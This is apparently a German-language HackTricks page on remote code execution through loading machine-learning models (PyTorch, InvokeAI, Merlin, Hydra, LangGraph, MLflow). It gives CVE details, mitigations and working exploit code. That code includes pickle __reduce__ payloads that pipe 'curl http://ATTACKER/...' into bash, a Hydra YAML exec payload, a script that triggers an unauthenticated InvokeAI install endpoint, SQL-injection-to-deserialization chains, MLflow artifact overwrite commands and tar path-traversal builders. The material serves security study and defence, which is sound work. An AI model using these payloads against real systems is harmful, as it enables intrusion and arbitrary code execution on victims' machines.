# Modelle RCE

{{#include ../banners/hacktricks-training.md}}

## Modelle laden, um RCE auszuführen

Machine-Learning-Modelle werden üblicherweise in verschiedenen Formaten wie ONNX, TensorFlow, PyTorch usw. weitergegeben. Entwickler oder Produktionssysteme können diese Modelle laden und verwenden. Normalerweise sollten die Modelle keinen schädlichen Code enthalten, aber in manchen Fällen kann ein Modell dazu verwendet werden, beliebigen Code auf dem System auszuführen – entweder als beabsichtigte Funktion oder aufgrund einer Schwachstelle in der Bibliothek zum Laden des Modells.

Die folgende Tabelle enthält repräsentative Schwachstellen dieser Kategorie:

| **Framework / Tool**        | **Schwachstelle (falls verfügbar: CVE)**                                                    | **RCE-Vektor**                                                                                                                           | **Referenzen**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Unsichere Deserialisierung in* `torch.load` **(CVE-2025-32434)**                                                              | Schädliches Pickle in einem Modell-Checkpoint führt zur Codeausführung (umgeht die `weights_only`-Schutzmaßnahme)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + schädlicher Modelldownload führt zur Codeausführung; Java-Deserialisierung-RCE in der Management-API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsichere Checkpoint-Deserialisierung über `torch.load` **(CVE-2025-23298)**                                           | Nicht vertrauenswürdiger Checkpoint löst beim Aufruf von `load_model_trainer_states_from_checkpoint` einen Pickle-Reducer aus → Codeausführung im ML-Worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsicherer MessagePack-Erweiterungshook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ein vom Benutzer kontrollierter `filter`-Schlüssel fügt SQL-/JSON-Path-Syntax ein, `UNION SELECT` fälscht eine Checkpoint-Zeile, anschließend importiert und ruft die `msgpack`-Deserialisierung vom Angreifer gewählten Python-Code auf | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsicheres YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Das Laden eines Modells aus YAML verwendet `yaml.unsafe_load` (Codeausführung) <br> Das Laden eines Modells mit einer **Lambda**-Schicht führt beliebigen Python-Code aus          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite-Parsing)                                                                                          | Ein manipuliertes `.tflite`-Modell löst einen Integer Overflow aus → Heap-Korruption (potenzielle RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Beim Laden eines Modells über `joblib.load` wird ein Pickle mit der `__reduce__`-Payload des Angreifers ausgeführt                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsicheres `np.load`) *umstritten*                                                                              | Der Standardwert von `numpy.load` erlaubte gepickelte Objekt-Arrays – eine schädliche `.npy/.npz`-Datei löst Codeausführung aus                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (Directory Traversal) <br> **CVE-2024-5187** (Tar Traversal)                                                    | Der Pfad zu externen Gewichten eines ONNX-Modells kann das Verzeichnis verlassen (beliebige Dateien lesen) <br> Ein schädliches ONNX-Modellarchiv kann beliebige Dateien überschreiben (was zu RCE führt) | |
| ONNX Runtime (Designrisiko)  | *(Keine CVE)* ONNX Custom Ops / Control Flow                                                                                    | Ein Modell mit einem Custom Operator erfordert das Laden von nativem Code des Angreifers; komplexe Modellgraphen missbrauchen Logik, um unbeabsichtigte Berechnungen auszuführen   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (Path Traversal)                                                                                          | Wenn `--model-control` aktiviert ist, ermöglicht die Verwendung der Model-Load-API Path Traversal mit relativen Pfaden, um Dateien zu schreiben (z. B. `.bashrc` für RCE zu überschreiben)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (mehrere Heap Overflows)                                                                         | Eine fehlerhafte GGUF-Modell-Datei verursacht Heap Buffer Overflows im Parser und ermöglicht so die Ausführung beliebigen Codes auf dem System des Opfers                     | |
| **Keras (ältere Formate)**   | *(Keine neue CVE)* Legacy-Keras-H5-Modell                                                                                         | Schädliche HDF5-Modell-Dateien (`.h5`) mit einer Lambda-Schicht führen beim Laden weiterhin Code aus (Keras `safe_mode` deckt das alte Format nicht ab – „Downgrade-Angriff“) | |
| **Andere** (allgemein)        | *Designfehler* – Pickle-Serialisierung                                                                                         | Viele ML-Tools (z. B. Pickle-basierte Modellformate, Python `pickle.load`) führen beliebigen Code aus, der in Modelldateien eingebettet ist, sofern keine Gegenmaßnahmen getroffen werden | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Nicht vertrauenswürdige Metadaten an `hydra.utils.instantiate()` übergeben **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Vom Angreifer kontrollierte Modellmetadaten/-konfiguration setzen `_target_` auf einen beliebigen Callable (z. B. `builtins.exec`) → wird beim Laden ausgeführt, auch bei „sicheren“ Formaten (`.safetensors`, `.nemo`, `config.json` im Repo) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Darüber hinaus gibt es einige Python-Pickle-basierte Modelle, etwa die von [PyTorch](https://github.com/pytorch/pytorch/security) verwendeten, mit denen beliebiger Code auf dem System ausgeführt werden kann, wenn sie nicht mit `weights_only=True` geladen werden. Daher können alle Pickle-basierten Modelle besonders anfällig für diese Art von Angriffen sein, auch wenn sie in der obigen Tabelle nicht aufgeführt sind.

### Hydra-Metadaten → RCE (funktioniert auch mit safetensors)

`hydra.utils.instantiate()` importiert und ruft jedes gepunktete `_target_` in einem Konfigurations-/Metadatenobjekt auf. Wenn Bibliotheken wie Hugging Face Transformers **nicht vertrauenswürdige Modellmetadaten** an `instantiate()` übergeben, kann ein Angreifer einen Callable und Argumente angeben, die beim Laden des Modells sofort ausgeführt werden (kein Pickle erforderlich).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Beispiel-Payload (funktioniert in `model_config.yaml` in `.nemo`, `config.json` im Repo oder `__metadata__` innerhalb von `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Wichtige Punkte:
- Wird vor der Modellinitialisierung in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders und FlexTok loaders ausgelöst.
- Hydras String-Blocklist lässt sich über alternative Importpfade umgehen (z. B. `enum.bltns.eval`) oder über von der Anwendung aufgelöste Namen (z. B. `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok analysiert außerdem stringifizierte Metadaten mit `ast.literal_eval`, wodurch vor dem Hydra-Aufruf ein DoS (Überlastung von CPU/Speicher) möglich ist.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` ist eine beliebte Open-Source-Weboberfläche für Stable-Diffusion. Die Versionen **5.3.1 – 5.4.2** stellen den REST-Endpunkt `/api/v2/models/install` bereit, über den Benutzer Modelle von beliebigen URLs herunterladen und laden können.<sup>[[1]](#references)</sup>

Intern ruft der Endpunkt schließlich Folgendes auf:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Wenn die bereitgestellte Datei ein **PyTorch-Checkpoint (`*.ckpt`)** ist, führt `torch.load` eine **Pickle-Deserialisierung** durch. Da der Inhalt direkt von der vom Benutzer kontrollierten URL stammt, kann ein Angreifer ein bösartiges Objekt mit einer benutzerdefinierten `__reduce__`-Methode in den Checkpoint einbetten. Diese Methode wird **während der Deserialisierung** ausgeführt, was zu **Remote Code Execution (RCE)** auf dem InvokeAI-Server führt.

Die Schwachstelle erhielt die Kennung **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploit-Ablauf

1. Erstellen Sie einen bösartigen Checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hosten Sie `payload.ckpt` auf einem HTTP-Server, den Sie kontrollieren (z. B. `http://ATTACKER/payload.ckpt`).
3. Lösen Sie den verwundbaren Endpoint aus (keine Authentifizierung erforderlich):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Wenn InvokeAI die Datei herunterlädt, ruft es `torch.load()` auf → das `os.system`-Gadget wird ausgeführt und der Angreifer erhält Codeausführung im Kontext des InvokeAI-Prozesses.

Fertiger Exploit: Das **Metasploit**-Modul `exploit/linux/http/invokeai_rce_cve_2024_12029` automatisiert den gesamten Ablauf.<sup>[[3]](#references)</sup>

#### Voraussetzungen

•  InvokeAI 5.3.1-5.4.2 (Standardwert für Scan-Flag: **false**)
•  `/api/v2/models/install` ist für den Angreifer erreichbar
•  Der Prozess verfügt über Berechtigungen zum Ausführen von Shell-Befehlen

#### Gegenmaßnahmen

* Upgrade auf **InvokeAI ≥ 5.4.3** – der Patch setzt `scan=True` als Standardwert und führt vor der Deserialisierung einen Malware-Scan durch.<sup>[[2]](#references)</sup>
* Verwenden Sie beim programmgesteuerten Laden von Checkpoints `torch.load(file, weights_only=True)` oder den neuen [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security)-Helper.
* Erzwingen Sie Allow-Lists / Signaturen für Modellquellen und führen Sie den Dienst mit den geringstmöglichen Berechtigungen aus.

> ⚠️ Denken Sie daran, dass **jedes** Python-Pickle-basierte Format (einschließlich vieler `.pt`-, `.pkl`-, `.ckpt`- und `.pth`-Dateien) grundsätzlich unsicher ist, wenn es aus nicht vertrauenswürdigen Quellen deserialisiert wird.

---

Beispiel für eine Ad-hoc-Gegenmaßnahme, wenn Sie ältere InvokeAI-Versionen hinter einem Reverse Proxy weiter betreiben müssen:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (Teil von Merlin) legte einen unsicheren Checkpoint-Loader offen, der `torch.load()` direkt mit benutzerseitig bereitgestellten Pfaden aufrief. Da `torch.load` auf Python `pickle` basiert, kann ein vom Angreifer kontrollierter Checkpoint während der Deserialisierung über einen Reducer beliebigen Code ausführen.<sup>[[5]](#references)</sup>

Verwundbarer Pfad (vor dem Fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Warum dies zu RCE führt: In Python pickle kann ein Objekt einen Reducer (`__reduce__`/`__setstate__`) definieren, der eine aufrufbare Funktion und Argumente zurückgibt. Die Funktion wird während des Unpickling ausgeführt. Ist ein solches Objekt in einem Checkpoint enthalten, wird es ausgeführt, bevor irgendwelche Gewichte verwendet werden.

Minimales Beispiel für einen schädlichen Checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Auslieferungsvektoren und Schadensradius:
- Trojanisierte Checkpoints/Modelle, die über Repos, Buckets oder Artifact Registries geteilt werden
- Automatisierte Resume-/Deploy-Pipelines, die Checkpoints automatisch laden
- Die Ausführung erfolgt innerhalb von Training-/Inference-Workern, oft mit erhöhten Berechtigungen (z. B. als root in Containern)

Behebung: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) ersetzte den direkten Aufruf von `torch.load()` durch einen eingeschränkten Deserializer mit Allowlist, implementiert in `transformers4rec/utils/serialization.py`. Der neue Loader validiert Typen/Felder und verhindert, dass während des Ladens beliebige Callables aufgerufen werden.<sup>[[7]](#references)</sup>

Spezielle Schutzmaßnahmen für PyTorch-Checkpoints:
- Untrusted Daten nicht unpicklen. Bevorzuge nach Möglichkeit nicht ausführbare Formate wie [Safetensors](https://huggingface.co/docs/safetensors/index) oder ONNX.
- Wenn du PyTorch-Serialisierung verwenden musst, stelle sicher, dass `weights_only=True` gesetzt ist (wird von neueren PyTorch-Versionen unterstützt), oder verwende einen benutzerdefinierten Unpickler mit Allowlist, ähnlich wie im Transformers4Rec-Patch.<sup>[[4]](#references)</sup>
- Erzwinge die Herkunftsprüfung/Signaturen des Modells und führe die Deserialisierung in einer Sandbox aus (seccomp/AppArmor; Nicht-root-Benutzer; eingeschränktes FS und kein ausgehender Netzwerkverkehr).
- Überwache ML-Dienste beim Laden von Checkpoints auf unerwartete Child-Prozesse; verfolge die Verwendung von `torch.load()`/`pickle`.

POC- und Referenzen zu verwundbaren Versionen/Patches:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Verwundbarer Loader vor dem Patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC für einen schädlichen Checkpoint: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader nach dem Patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Beispiel – Erstellen eines schädlichen PyTorch-Modells

- Erstelle das Modell:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Modell laden:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialisierung von Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD stellt einen `resnet`-Endpoint bereit, der vom Benutzer kontrollierte Daten deserialisiert. ZDI bestätigte, dass ein Remote-Angreifer ein Opfer dazu bringen kann, eine bösartige Seite/Datei zu laden, diese einen speziell präparierten serialisierten Blob an diesen Endpoint senden und dadurch eine Deserialisierung als `root` auslösen zu lassen, was zur vollständigen Kompromittierung führt.

Der Exploit-Ablauf entspricht dem typischen pickle-Missbrauch:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Jedes Gadget, das während der Deserialisierung erreichbar ist (Konstruktoren, `__setstate__`, Framework-Callbacks usw.), kann auf dieselbe Weise weaponized werden, unabhängig davon, ob der Transport HTTP, WebSocket oder eine Datei war, die in einem überwachten Verzeichnis abgelegt wurde.



### LangGraph-checkpointer-SQLi → MessagePack-RCE

Diese Angriffskette ist interessant, weil der Angreifer **keine schädliche Modelldatei hochladen muss**. Stattdessen stellt die Anwendung eine **Persistenz-API für KI-Agenten** (`get_state_history(..., filter=...)`) bereit, und Benutzereingaben gelangen zum Checkpointer-Query-Builder.

#### 1. Strukturelle SQLi in Metadatenfiltern

Ein verwundbares SQLite-Muster sah so aus:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Der Wert wird später gebunden, aber `query_key` wird in den **JSON-Pfad-String** verkettet. Ein `'` innerhalb des Dictionary-Schlüssels bricht daher aus `'$.{query_key}'` aus und schleust SQL ein. Dasselbe gilt für **JSON-Pfade, Bezeichner, Operatoren, `LIMIT`- und TTL-Felder**: Platzhalter schützen nur Werte, nicht die strukturelle Query-Syntax.

#### 2. `UNION SELECT` kann nachgelagerte Senken ansteuern, nicht nur Daten stehlen

Die Query gibt `type` und serialisierte `checkpoint`-Bytes zurück, die später wie folgt verarbeitet werden:

```python
self.serde.loads_typed((type, checkpoint))
```

Das bedeutet, dass eine SQLi in der `WHERE`-Klausel eine **gefälschte Ergebniszeile** einschleusen kann:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Wenn späterer Code eine ausgewählte Spalte parst, deserialisiert, schreibt oder ausführt, ordne diese Spalten ihren Sinks zu. In diesem Fall verwandelt die gefälschte Zeile SQLi in **attacker-controlled deserialization**.

#### 3. Unsichere MessagePack-Extension-Hooks entsprechen Code-Gadgets

LangGraphs `msgpack`-Pfad verwendete einen benutzerdefinierten Extension-Hook, der ein verschachteltes Tupel entpackte und Folgendes ausführte:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Ein MessagePack-Erweiterungsobjekt, das etwas Entsprechendem zu `("os", "system", "id > /tmp/pwned")` kodiert, importiert `os`, löst `system` auf und führt den Befehl aus. Prüfe bei KI-Frameworks **benutzerdefinierte MessagePack/JSON/pickle-Reviver** auf dynamische Imports, Reflection oder den Aufruf beliebiger Callables.

#### 4. Praktisches Audit-Muster für Agent-Frameworks

Prüfe jede benutzergesteuerte Eingabe, die Folgendes erreicht:
- APIs zum Auflisten von Statusverläufen / Speicher / Wiederholungen / Checkpoints
- strukturierte Filter-Builder, die SQL- oder Redis-Abfragefragmente erzeugen
- benutzerdefinierte Deserialisierer (`pickle`, `msgpack`, `json`-Object-Hooks, YAML-Konstruktoren)
- Wiederherstellungspfade, die den von der Persistenzschicht zurückgegebenen Zeilen vertrauen

Diese konkrete Angriffskette betraf selbst gehostete LangGraph-Deployments mit **SQLite**- oder **Redis**-Checkpointern, wenn nicht vertrauenswürdige Benutzer `filter` kontrollieren konnten. Die in der Offenlegung genannten gepatchten Versionen waren `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` und `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### MLflow-PyFunc-Artefaktüberschreibung zu pickle-RCE

Ein aus einem `PythonModel` erstelltes MLflow-PyFunc kann das serialisierte Objekt als `python_model.pkl` speichern. Die Modellmetadaten geben `mlflow.pyfunc.model` als Loader an, und die MLflow-Implementierung verwendet diesen Dateinamen für das gespeicherte Python-Modell. Daher kann Schreibzugriff auf den Artefaktspeicher zur Codeausführung in einer anderen Anwendung führen, die das Modell später lädt.<sup>[[17]](#references)[[18]](#references)</sup>

Die relevante Angriffskette lautet **Schreibberechtigung für Artefakte → pickle ersetzen → einen Inference-Consumer dazu bringen, es erneut zu laden**. Ermittle bei einem Experiment mit einem proxied `mlflow-artifacts:/...`-Root den Experiment-, Run- und Modell-Artefaktpfad. Der Tracking-Server stellt `GET` und `PUT` unter `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>` bereit.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Ein minimaler Reducer kann einen Befehl ausführen, sobald der Consumer das Artefakt unpickelt. Wenn du die Payload mit der in `MLmodel` angegebenen Python-Version generierst, vermeidest du Kompatibilitätsprobleme.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Lösen Sie den Vorgang aus, der **das vorhandene Modell lädt**, z. B. eine Vorhersage, Bewertung oder Bereitstellung. Trainieren Sie nicht zuerst erneut, da das Training das bösartige Artefakt durch ein neues Modell ersetzen kann. Ein Anwendungsfehler widerlegt die Exploitation nicht: Der reducer gibt den ganzzahligen Exit-Status des Befehls statt eines nutzbaren Modells zurück. Beginnen Sie mit einer beobachtbaren Nebenwirkung wie ICMP oder einem HTTP-Callback und ersetzen Sie diese dann durch die finale Payload.<sup>[[20]](#references)</sup>

Unterscheiden Sie während der Sicherheitsbewertung zwischen der Berechtigung, einen Run zu erstellen, und der Berechtigung, Artefakte eines anderen Runs zu überschreiben. Prüfen Sie die Authentifizierung und die Update-Berechtigungen pro Run, untersuchen Sie unerwartete Änderungen an `python_model.pkl` und behandeln Sie die Herkunft und Integrität des Modells als Teil der Ausführungsgrenze. Aktueller MLflow-Code unterstützt auch das Setzen von `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` und empfiehlt models-from-code-Artefakte, anstatt cloudpickle-Daten zu laden.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Modelle für Path Traversal

Wie in [**diesem Blogbeitrag**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties) angemerkt, basieren die meisten Modellformate verschiedener AI-Frameworks auf Archiven, in der Regel `.zip`. Daher lassen sich diese Formate möglicherweise für Path-Traversal-Angriffe ausnutzen, um beliebige Dateien auf dem System zu lesen, auf dem das Modell geladen wird.<sup>[[16]](#references)</sup>

Mit dem folgenden Code können Sie beispielsweise ein Modell erstellen, das beim Laden eine Datei im Verzeichnis `/tmp` erstellt:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Oder mit dem folgenden Code können Sie ein Modell erstellen, das beim Laden einen Symlink zum Verzeichnis `/tmp` erstellt:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Tiefgehende Analyse: Keras-.keras-Deserialisierung und Gadget Hunting

Einen fokussierten Leitfaden zu den Interna von .keras, RCE über Lambda-Layer, dem Problem mit beliebigen Imports in Versionen ≤ 3.8 und der Suche nach Gadgets innerhalb der Allowlist nach dem Fix findest du hier:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [OffSec-Blog – „CVE-2024-12029 – InvokeAI: Deserialisierung nicht vertrauenswürdiger Daten“](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [InvokeAI-Patch-Commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Dokumentation des Rapid7-Metasploit-Moduls](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – Sicherheitsaspekte von torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [ZDI-Blog – CVE-2025-23298: Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [ZDI-Advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Transformers4Rec-Patch-Commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Verwundbarer Loader vor dem Patch (Gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC für einen bösartigen Checkpoint (Gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader nach dem Patch (Gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Remote Code Execution mit modernen KI/ML-Formaten und -Bibliotheken](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Hydra-Dokumentation zu instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Hydra-Commit zur Blockliste (Warnung vor RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – Von SQLi zu RCE: Ausnutzung des Checkpointers von LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Archive-Slip-Bugs für hochwertige AI/ML-Bounties nutzen](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Snyk-Advisory und PyFunc-Proof-of-Concept – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [MLflow-Quellcode – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow-REST-API – Endpoints zum Herunter- und Hochladen von Artefakten](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
